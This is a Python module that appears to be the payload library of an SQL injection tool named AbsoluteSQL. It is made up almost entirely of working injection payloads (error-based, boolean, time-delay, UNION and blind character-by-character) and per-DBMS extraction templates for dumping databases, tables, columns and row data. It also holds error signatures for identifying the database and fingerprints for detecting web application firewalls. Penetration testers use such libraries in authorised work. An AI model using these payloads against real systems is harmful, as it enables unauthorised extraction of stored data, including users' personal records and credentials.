"""
AbsoluteSQL — Payload Library
All injection payloads, DBMS error signatures, WAF fingerprints,
and extraction query templates.
"""

import re

# ─────────────────────────────────────────────────────────────────────────────
# DBMS Error Signatures
# ─────────────────────────────────────────────────────────────────────────────

DBMS_ERRORS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning:\s+mysql",
        r"warning:\s+mysqli",
        r"mysql_fetch_",
        r"mysql_num_rows",
        r"supplied argument is not a valid MySQL",
        r"column count doesn't match",
        r"com\.mysql\.jdbc",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"MySqlException",
        r"\[MySQL\]\[ODBC",
        r"mysql_query\(\)",
        r"mysql error",
    ],
    "PostgreSQL": [
        r"pg_query\(\):",
        r"pg_exec\(\):",
        r"warning.*\bpg_",
        r"PostgreSQL.*ERROR",
        r"ERROR:\s+syntax error at or near",
        r"PostgreSQL query failed",
        r"org\.postgresql\.util\.PSQLException",
        r"PSQLException",
        r"com\.postgresql",
        r"PostgreSQL.*Driver",
        r"unterminated quoted string at or near",
        r"invalid input syntax for",
    ],
    "Microsoft SQL Server": [
        r"driver.*SQL[\s_-]*Server",
        r"OLE DB.*SQL Server",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Warning.*mssql_",
        r"Unclosed quotation mark",
        r"Incorrect syntax near",
        r"Microsoft SQL Native Client error",
        r"SqlException",
        r"\[SQL Server\]",
        r"\[ODBC SQL Server\]",
        r"SQLServer JDBC Driver",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"ADODB\.Field",
        r"ADODB\.Recordset",
        r"mssql_query",
    ],
    "Oracle": [
        r"\bORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\boci_",
        r"Warning.*\bora_",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"ORA-01756",
        r"ORA-00933",
        r"ORA-00907",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d+:",
        r"sqlite3\.OperationalError:",
        r"SQLITE_CONSTRAINT",
        r"sqlite_master",
        r"no such table:",
        r"near .* syntax error",
    ],
    "MariaDB": [
        r"MariaDB.*syntax error",
        r"Warning.*MariaDB",
        r"com\.mariadb\.jdbc",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# WAF Signatures
# ─────────────────────────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "body":    ["cloudflare", "ray id:", "__cfduid", "cf-ray"],
        "status":  [403, 503],
    },
    "ModSecurity": {
        "headers": ["mod_security", "modsecurity"],
        "body":    ["not acceptable!", "406 not acceptable", "mod_security", "modsecurity"],
        "status":  [403, 406],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amzn-trace-id"],
        "body":    ["aws waf", "request blocked by aws waf"],
        "status":  [403],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body":    ["sucuri website firewall", "access denied - sucuri"],
        "status":  [403],
    },
    "Imperva": {
        "headers": ["x-iinfo", "visid_incap", "incap_ses"],
        "body":    ["incapsula", "powered by imperva"],
        "status":  [403],
    },
    "F5 BIG-IP ASM": {
        "headers": ["bigipserver", "f5-bigip"],
        "body":    ["the requested url was rejected", "f5 networks"],
        "status":  [403, 502],
    },
    "Akamai": {
        "headers": ["akamaighost", "akamai-origin-hop", "x-akamai-transformed"],
        "body":    ["access denied", "reference #", "akamai"],
        "status":  [403],
    },
    "Barracuda": {
        "headers": ["barra_counter_session"],
        "body":    ["barracuda", "blocked by barracuda"],
        "status":  [403],
    },
    "SonicWALL": {
        "headers": ["sonicwall"],
        "body":    ["this request is blocked by the sonicwall"],
        "status":  [403],
    },
    "FortiWeb": {
        "headers": ["fortiweb-id"],
        "body":    ["access blocked by fortiweb"],
        "status":  [403],
    },
    "Wordfence": {
        "headers": [],
        "body":    ["wordfence", "your access to this site has been limited"],
        "status":  [403],
    },
    "DenyAll": {
        "headers": ["x-denied-reason", "x-reason"],
        "body":    ["denyall", "request denied"],
        "status":  [403],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Error-Based Detection Payloads
# ─────────────────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    '"',
    "'''",
    '"""',
    "`",
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    '" OR "1"="1',
    '" OR 1=1--',
    "') OR ('1'='1",
    "') OR 1=1--",
    "' AND 1=1--",
    "' AND 1=0--",
    "1' ORDER BY 1--",
    "1' ORDER BY 9999--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' GROUP BY columnnames having 1=1--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1)),1)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=cast((SELECT version()) as int)--",
    "' AND 1=1 FROM dual--",
    "1;SELECT SLEEP(0)--",
    "--",
    "#",
    "/*",
    "*/",
]

# ─────────────────────────────────────────────────────────────────────────────
# Boolean-Based Payloads
# ─────────────────────────────────────────────────────────────────────────────

BOOLEAN_TRUE = [
    "' AND '1'='1",
    "' AND 1=1--",
    "' AND 1=1#",
    "' AND 1=1/*",
    '" AND "1"="1',
    '" AND 1=1--',
    ") AND 1=1--",
    ") AND ('1'='1",
    " AND 1=1",
    " AND 1=1--",
    "' OR '1'='1",
    "' OR 1=1--",
    "1 AND 1=1",
    "1' AND '1'='1",
]

BOOLEAN_FALSE = [
    "' AND '1'='2",
    "' AND 1=2--",
    "' AND 1=2#",
    "' AND 1=2/*",
    '" AND "1"="2',
    '" AND 1=2--',
    ") AND 1=2--",
    ") AND ('1'='2",
    " AND 1=2",
    " AND 1=2--",
    "' OR '1'='2",
    "' OR 1=2--",
    "1 AND 1=2",
    "1' AND '1'='2",
]

# ─────────────────────────────────────────────────────────────────────────────
# Time-Based Payloads
# ─────────────────────────────────────────────────────────────────────────────

TIME_PAYLOADS = {
    "MySQL": [
        "' AND SLEEP({delay})--",
        "' AND SLEEP({delay})#",
        "' OR SLEEP({delay})--",
        '" AND SLEEP({delay})--',
        " AND SLEEP({delay})--",
        "';SELECT SLEEP({delay})--",
        "1' AND SLEEP({delay}) AND '1'='1",
        "1 AND SLEEP({delay})",
    ],
    "Microsoft SQL Server": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        '" WAITFOR DELAY \'0:0:{delay}\'--',
        "1; WAITFOR DELAY '0:0:{delay}'--",
        " WAITFOR DELAY '0:0:{delay}'--",
        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'--",
        "'; WAITFOR DELAY '0:0:{delay}';--",
    ],
    "PostgreSQL": [
        "' AND pg_sleep({delay})--",
        '" AND pg_sleep({delay})--',
        " AND pg_sleep({delay})--",
        "1 AND pg_sleep({delay})",
        "';SELECT pg_sleep({delay})--",
        "' OR pg_sleep({delay})--",
    ],
    "Oracle": [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
        " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})",
        "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
    ],
    "SQLite": [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))--",
        " AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))",
    ],
    "generic": [
        "' AND SLEEP({delay})--",
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' AND pg_sleep({delay})--",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# UNION-Based Payloads
# ─────────────────────────────────────────────────────────────────────────────

UNION_ORDER_BY = [
    "' ORDER BY {n}--",
    "' ORDER BY {n}#",
    '" ORDER BY {n}--',
    " ORDER BY {n}--",
    "1 ORDER BY {n}--",
    "' ORDER BY {n} DESC--",
]

UNION_NULL_TEST = [
    "' UNION SELECT {nulls}--",
    "' UNION ALL SELECT {nulls}--",
    '" UNION SELECT {nulls}--',
    '" UNION ALL SELECT {nulls}--',
    " UNION SELECT {nulls}--",
    " UNION ALL SELECT {nulls}--",
    "1 UNION SELECT {nulls}",
    "-1 UNION SELECT {nulls}--",
    "-1 UNION ALL SELECT {nulls}--",
]

UNION_MARKER = "ABSQLMARK"

# ─────────────────────────────────────────────────────────────────────────────
# Extraction Query Templates
# ─────────────────────────────────────────────────────────────────────────────

EXTRACTION_QUERIES = {
    "MySQL": {
        "version":         "SELECT @@version",
        "user":            "SELECT user()",
        "database":        "SELECT database()",
        "hostname":        "SELECT @@hostname",
        "datadir":         "SELECT @@datadir",
        "databases":       "SELECT schema_name FROM information_schema.schemata",
        "tables":          "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
        "tables_current":  "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns":         "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}'",
        "data":            "SELECT {cols} FROM `{db}`.`{table}` LIMIT {limit} OFFSET {offset}",
        "concat_row":      "CONCAT_WS(0x7c7c,{cols})",
        "row_count":       "SELECT COUNT(*) FROM `{db}`.`{table}`",
        "privileges":      "SELECT PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES",
    },
    "PostgreSQL": {
        "version":         "SELECT version()",
        "user":            "SELECT current_user",
        "database":        "SELECT current_database()",
        "hostname":        "SELECT inet_server_addr()",
        "databases":       "SELECT datname FROM pg_database WHERE datistemplate=false",
        "tables":          "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        "tables_schema":   "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
        "columns":         "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data":            "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        "concat_row":      "CONCAT({cols})",
        "row_count":       "SELECT COUNT(*) FROM {table}",
    },
    "Microsoft SQL Server": {
        "version":         "SELECT @@version",
        "user":            "SELECT SYSTEM_USER",
        "database":        "SELECT DB_NAME()",
        "hostname":        "SELECT @@SERVERNAME",
        "databases":       "SELECT name FROM master..sysdatabases",
        "tables":          "SELECT name FROM {db}..sysobjects WHERE xtype='U'",
        "tables_current":  "SELECT name FROM sysobjects WHERE xtype='U'",
        "columns":         "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data":            "SELECT TOP {limit} {cols} FROM {db}..{table}",
        "concat_row":      "CAST({col} AS VARCHAR(MAX))",
        "row_count":       "SELECT COUNT(*) FROM {table}",
    },
    "Oracle": {
        "version":         "SELECT banner FROM v$version WHERE rownum=1",
        "user":            "SELECT user FROM dual",
        "database":        "SELECT name FROM v$database",
        "databases":       "SELECT owner FROM all_tables GROUP BY owner",
        "tables":          "SELECT table_name FROM all_tables WHERE owner='{db}'",
        "tables_current":  "SELECT table_name FROM user_tables",
        "columns":         "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND owner='{db}'",
        "data":            "SELECT {cols} FROM {db}.{table} WHERE ROWNUM<={limit}",
        "concat_row":      "TO_CHAR({col})",
        "row_count":       "SELECT COUNT(*) FROM {table}",
    },
    "SQLite": {
        "version":         "SELECT sqlite_version()",
        "user":            "SELECT 'sqlite_user'",
        "database":        "SELECT 'main'",
        "databases":       "SELECT name FROM pragma_database_list",
        "tables":          "SELECT tbl_name FROM sqlite_master WHERE type='table'",
        "columns":         "SELECT name FROM pragma_table_info('{table}')",
        "data":            "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        "concat_row":      "CAST({col} AS TEXT)",
        "row_count":       "SELECT COUNT(*) FROM {table}",
    },
    "MariaDB": {  # Mostly same as MySQL
        "version":         "SELECT @@version",
        "user":            "SELECT user()",
        "database":        "SELECT database()",
        "databases":       "SELECT schema_name FROM information_schema.schemata",
        "tables":          "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
        "tables_current":  "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns":         "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}'",
        "data":            "SELECT {cols} FROM `{db}`.`{table}` LIMIT {limit} OFFSET {offset}",
        "concat_row":      "CONCAT_WS(0x7c7c,{cols})",
        "row_count":       "SELECT COUNT(*) FROM `{db}`.`{table}`",
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Error-Based Extraction Templates
# ─────────────────────────────────────────────────────────────────────────────

ERROR_EXTRACT_TEMPLATES = {
    "MySQL": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,IFNULL(({query}),''),0x7e),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
        "' AND EXP(~(SELECT * FROM (SELECT ({query}))x))--",
    ],
    "Microsoft SQL Server": [
        "' AND 1=CONVERT(int,({query}))--",
        "' AND 1=CAST(({query}) AS int)--",
        "';DECLARE @x varchar(1000);SET @x=({query});SELECT 1/0 WHERE 1=1 AND @x=@x--",
    ],
    "PostgreSQL": [
        "' AND 1=CAST(({query}) AS int)--",
        "' UNION SELECT CAST(({query}) AS numeric)--",
        "' AND 1=(SELECT CAST(({query}) AS integer))--",
    ],
    "Oracle": [
        "' AND ctxsys.drithsx.sn(user,({query}))=1--",
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||({query})||CHR(62))) FROM dual)--",
        "' UNION SELECT ({query}) FROM dual--",
    ],
    "SQLite": [
        "' UNION SELECT ({query})--",
        "' AND 1=1 AND ({query}) IS NOT NULL--",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# Blind Boolean Extraction Templates (char-by-char)
# ─────────────────────────────────────────────────────────────────────────────

BLIND_EXTRACT_TEMPLATES = {
    "MySQL": "' AND SUBSTRING(({query}),{pos},1)='{char}'--",
    "PostgreSQL": "' AND SUBSTRING(({query}),{pos},1)='{char}'--",
    "Microsoft SQL Server": "' AND SUBSTRING(({query}),{pos},1)='{char}'--",
    "Oracle": "' AND SUBSTR(({query}),{pos},1)='{char}'--",
    "SQLite": "' AND SUBSTR(({query}),{pos},1)='{char}'--",
    "generic": "' AND SUBSTRING(({query}),{pos},1)='{char}'--",
}

BLIND_LENGTH_TEMPLATES = {
    "MySQL": "' AND LENGTH(({query}))={length}--",
    "PostgreSQL": "' AND LENGTH(({query}))={length}--",
    "Microsoft SQL Server": "' AND LEN(({query}))={length}--",
    "Oracle": "' AND LENGTH(({query}))={length}--",
    "SQLite": "' AND LENGTH(({query}))={length}--",
    "generic": "' AND LENGTH(({query}))={length}--",
}

# ─────────────────────────────────────────────────────────────────────────────
# Helper Functions
# ─────────────────────────────────────────────────────────────────────────────

def get_error_payloads() -> list:
    """All error-detection payloads."""
    return list(ERROR_PAYLOADS)


def get_time_payloads(dbms: str = "generic", delay: int = 5) -> list:
    """Time-based payloads, delay substituted in."""
    pool = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["generic"])
    return [p.replace("{delay}", str(delay)) for p in pool]


def get_boolean_pairs() -> list:
    """List of (true_payload, false_payload) tuples."""
    return list(zip(BOOLEAN_TRUE, BOOLEAN_FALSE))


def get_union_order_by(n: int) -> list:
    return [p.replace("{n}", str(n)) for p in UNION_ORDER_BY]


def get_union_null_test(n: int) -> list:
    nulls = ",".join(["NULL"] * n)
    return [p.replace("{nulls}", nulls) for p in UNION_NULL_TEST]


def detect_dbms_from_errors(text: str) -> list:
    """Return list of DBMS names whose error signatures matched."""
    found = []
    for dbms, patterns in DBMS_ERRORS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                if dbms not in found:
                    found.append(dbms)
                break
    return found


def detect_waf_from_response(headers: dict, body: str, status_code: int) -> list:
    """Return list of WAF names detected from headers / body / status."""
    detected = []
    hdr_lower = {k.lower(): v.lower() for k, v in headers.items()}
    body_low  = body.lower()

    for waf, sigs in WAF_SIGNATURES.items():
        hit = False
        for h in sigs.get("headers", []):
            h = h.lower()
            if ":" in h:
                k, v = h.split(":", 1)
                if k.strip() in hdr_lower and v.strip() in hdr_lower.get(k.strip(), ""):
                    hit = True
                    break
            elif any(h in k or h in v for k, v in hdr_lower.items()):
                hit = True
                break
        if not hit:
            for b in sigs.get("body", []):
                if b.lower() in body_low:
                    hit = True
                    break
        if hit:
            detected.append(waf)
    return detected
